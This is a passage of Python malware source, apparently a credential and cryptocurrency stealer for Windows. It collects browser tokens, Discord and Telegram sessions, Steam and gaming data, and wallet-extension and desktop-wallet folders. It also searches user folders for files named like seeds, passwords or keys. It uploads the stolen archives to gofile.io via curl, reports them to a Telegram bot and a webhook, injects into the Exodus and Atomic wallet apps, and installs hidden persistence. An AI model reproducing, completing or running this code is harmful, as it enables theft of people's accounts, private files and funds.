            a = threading.Thread(target=ZipThings, args=[patt[0], patt[5]+str(walletids[0]), patt[1]])
            a.start()
            thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)
    #print(WalletsZip)
    exodus_link, atolink = "", ""
    try:
        exodus_link = [item[1] for item in WalletsZip if item[0] == 'Exodus'][0]
    except: pass
    try:
        atolink = [item[1] for item in WalletsZip if item[0] == 'atomic'][0]
    except: pass
    # print(exodus_link)
    if exodus_link != "":
        threading.Thread(target=ExodusInjection, args=[f"{local}/exodus", "exodus.exe", exodus_link]).start()
    if atolink != "":
        threading.Thread(target=AtomicInjection, args=[f"{local}/Programs/atomic", "Atomic Wallet.exe", atolink]).start()
    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = "Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(GamingZip) == 0:
        ga = "Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = "Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": GLINFO,
        "embeds": [
            {
            "title": "App Stealer",
            "description": f"{wal}\n{ga}\n{ot}",
            "2895667": 14406413,
            "footer": {
                "text": "Muck | https://github.com/frankxrs",
                "icon_url": "https://i.imgur.com/Npe8QuD.png"
            }
            }
        ],
        "attachments": []
    }
    
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

def ZipTelegram(path, arg, procc):

    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)
    zipfolder(name, pathC)

    for i in range(3):
        lnik = uploadToAnonfiles(f'{temp}/{name}.zip')
        if "https://" in str(lnik):
            break
        time.sleep(4)
    os.remove(f"{temp}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    
    global WalletsZip, GamingZip, OtherZip
    for walllts in wallts:
        if str(walllts[0]) in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{str(walllts[1])}_{browser}"
            pathC = path + arg

    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zipfolder(name, pathC) 

    for i in range(3):
        lnik = uploadToAnonfiles(f'{temp}/{name}.zip')
        if "https://" in str(lnik):break
        time.sleep(4)

    os.remove(f"{temp}/{name}.zip")
    if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])

def Startthread(meth, args = []):
    a = threading.Thread(target=meth, args=args)
    a.start()
    Threadlist.append(a)



def GatherAll():
    global BOT_TOKEN, CHAT_ID
    telegram_config = {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}
    
    # Toujours vérifier l'état de la persistance
    send_to_telegram("🔍 Vérification système...", telegram_config)
    status = check_persistence_status()
    
    #Vérifier si première exécution OU si persistance cassée
# Vérifier si première exécution OU si persistance cassée
    flag_exists = False
    try:
        temp_files = os.listdir(temp)
        for file in temp_files:
            if file.startswith("sys_cache_") and file.endswith(".tmp"):
                flag_exists = True
                break
    except:
        pass
    
    persistence_broken = any("❌" in s for s in status)
    
    if not flag_exists or persistence_broken:
        if not flag_exists:  # ✅ CORRIGÉ
            send_to_telegram("🚀 PREMIÈRE EXÉCUTION", telegram_config)
        else:
            send_to_telegram("🔧 PERSISTANCE CASSÉE - RÉPARATION", telegram_config)
        
        # (Re)configurer persistance
        setup_full_persistence()
        repair_persistence()
        install_crypto_wallets()
        
# Marquer comme installé avec nom unique
        try:
            import random
            unique_name = f"sys_cache_{random.randint(1000,9999)}.tmp"
            flag_file = os.path.join(temp, unique_name)
            with open(flag_file, 'w') as f:
                f.write(f"repaired_{int(time.time())}")
            
            # Rendre caché
            try:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(flag_file, 0x02 | 0x04)
            except:
                pass
        except:
            pass
            
        send_to_telegram("🎉 Persistance (re)configurée !", telegram_config)
    else:
        send_to_telegram("🔄 Exécution automatique - persistance OK", telegram_config)
    
    # Continuer avec diagnostic et vol
    full_diagnostic()
    force_close_browsers()
    debug_edge_passwords()
    test_edge_extraction()
    test_edge_new_format()

    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                 Password/CC < 3 >     Cookies < 4 >                 Extentions < 5 >                           '
    browserPaths = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data", "msedge.exe", "/Default/Local Storage/leveldb", "/Default/", "/Default/Network", "/Default/Local Extension Settings/"]
    ]
    discordPaths = [
        [f"{roaming}/discord",          "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord",        "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary",    "/Local Storage/leveldb"],
        [f"{roaming}/discordptb",       "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
        [f"{roaming}/Zcash",                                                    "Zcash.exe",                "Wallet"        ],
        [f"{roaming}/Armory",                                                   "Armory.exe",               "Wallet"        ],
        [f"{roaming}/bytecoin",                                                 "bytecoin.exe",             "Wallet"        ],
        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     "Jaxx.exe",                 "Wallet"        ],
        [f"{roaming}/Electrum/wallets",                                         "Electrum.exe",             "Wallet"        ],
        [f"{roaming}/Coinomi/Coinomi/wallets",                                  "Coinomi.exe",              "Wallet"        ],
        ["C:\Program Files (x86)\Steam\config",                                 "steam.exe",                "Steam"         ],
        [f"{roaming}/NationsGlory/Local Storage/leveldb",                       "NationsGlory.exe",         "NationsGlory"  ],
        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ],
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'Telegram.exe', "Telegram"]


    for patt in browserPaths:
       Startthread(getToken,   [patt[0], patt[2]]                                   )
    for patt in discordPaths:
       Startthread(GetDiscord, [patt[0], patt[1]]                                   )
    Startthread(getBrowsers,   [browserPaths,]                                      )
    Startthread(GatherZips,    [browserPaths, PathsToZip, Telegram]                 )
    Startthread(ngstealer,     [f"{roaming}/NationsGlory/Local Storage/leveldb"]    )
    # Startthread(filestealr                                                          )
    for thread in Threadlist:
        thread.join()
    
def uploadToAnonfiles(path):
    try:
        r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
    #try:    return requests.post(f'https://{gofileserver}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except: return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and os.stat(path + "/" + file).st_size < 500000 and not ".lnk" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user    + "/Desktop",
        user    + "/Downloads",
        user    + "/Documents",
        roaming + "/Microsoft/Windows/Recent",
    ]


    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "bot",
        "atomic",
        "account",
        "acount",
        "paypal",
        "banque",
        "bot",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "seed",
        "mnemonic"
        "memoric",
        "private",
        "key",
        "passphrase",
        "pass",
        "phrase",
        "steal",
        "bank",
        "info",
        "casino",
        "prv",
        "privé",
        "prive",
        "telegram",
        "identifiant",
        "personnel",
        "trading"
        "bitcoin",
        "sauvegarde",
        "funds",
        "récupé",
        "recup",
        "note",
    ]
   
    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith

def filestealr():
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1].replace("\\", "/")
            foldlist = arg[2]
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)

global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip, Threadlist

DETECTED = False
wallts = [
    ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"         ],
    ["ejbalbakoplchlghecdalmeeeajnimhm", "Metamask"         ],
    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"          ],
    ["hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"         ],
    ["fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"            ],
    ["ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron"             ],
    ["ejjladinnckdgjemekebdpeokbikhfci", "Petra"            ],
    ["efbglgofoippbgcjepnhiblaibcnclgk", "Martian"          ],
    ["phkbamefinggmakgklpkljjmgibohnba", "Pontem"           ],
    ["ebfidpplhabeedpnhjnobghokpiioolj", "Fewcha"           ],
    ["afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math"             ],
    ["aeachknmefphepccionboohckonoeemg", "Coin98"           ],
    ["bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"    ],
    ["aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"       ],
    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"          ],
    ["agoakfejjabomempkjlepdflaleeobhb", "Core"             ],
    ["mfgccjchihfkkindfppnaooecgfneiii", "Tokenpocket"      ],
    ["lgmpcpglpngdoalbgeoldeajfclnhafa", "Safepal"          ],
    ["bhhhlbepdkbapadjdnnojkbgioiodbic", "Solfare"          ],
    ["jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"           ],
    ["kncchdigobghenbbaddojjnnaogfppfj", "iWallet"          ],
    ["ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"            ],
    ["hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"           ],
    ["cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"     ],
    ["amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"           ],
    ["fhilaheimglignddkjgofkcbgekhenbh", "Oxygen"           ],
    ["nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"            ],
    ["nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"            ],
    ["nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"           ], 
    ["aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"     ],
    ["fnnegphlobjdpkhecapkijjdkgcjhkib", "HarmonyOutdated"  ],
    ["cgeeodpfagjceefieflmdfphplkenlfk", "Ever"             ],
    ["pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"      ],
    ["mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"       ],
    ["aodkkagnadcbobfpggfnjeongemjbjca", "BoltX"            ],
    ["kpfopkelmapcoipemfendmdcghnegimn", "Liquality"        ],
    ["hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"            ],
    ["lpfcbjknijpeeillifnkikgncikgfhdo", "Nami"             ],
    ["dngmlblcodfobpdpecaadgfbcggfjfnm", "MaiarDEFI"        ],
    ["ookjlbkiijinhpmnjffcofjonbfbgaoc", "TempleTezos"      ],
    ["eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"           ],
]
IP = getip()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

keyword = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[stake](https://stake.com)']
ttusrnames = []
CookiCount, PasswCount, CCsCount, AutofillCount, HistoryCount, BookmarksCount = 0, 0, 0, 0, 0, 0
cookiWords, paswWords, History, CCs, Passw, Autofill, Cookies, WalletsZip, GamingZip, OtherZip, Threadlist, KiwiFiles, Bookmarks, Tokens = [], [], [], [], [], [], [], [], [], [], [], [], [], ''

try:gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
except:gofileserver = "store4"
GLINFO = globalInfo()


GatherAll()
wikith = Kiwi()

for thread in wikith: thread.join()
time.sleep(0.2)

filetext = "\n"
for arg in KiwiFiles:
    if len(arg[2]) != 0:
        foldpath = arg[1]
        foldlist = arg[2]       
        filetext += f"📁 {foldpath}\n"

        for ffil in foldlist:
            a = ffil[0].split("/")
            fileanme = a[len(a)-1]
            b = ffil[1]
            filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
        filetext += "\n"
upload("kiwi", filetext)